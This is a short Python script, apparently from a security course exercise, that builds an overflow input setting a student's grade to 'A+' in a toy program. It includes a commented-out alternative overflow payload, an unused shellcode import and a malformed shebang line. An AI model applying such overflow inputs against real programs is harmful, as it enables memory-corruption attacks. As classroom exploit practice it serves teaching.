#/bash/bin/python3
import sys
import struct
from shellcode import shellcode

def generate_input():
    padding = b'A' * 2
    grade_value = b"A+\x00"
    name_value = b"yzz0229\x00"
    return name_value + padding + grade_value
    

malicious_input = generate_input()
#buffer_size = 64
#value_to_overwrite_with = b"Hi yzz0229! Your grade is A+."
#malicious_input = b'A' * buffer_size
#malicious_input += struct.pack('<I', value_to_overwrite_with)
sys.stdout.buffer.write(malicious_input)
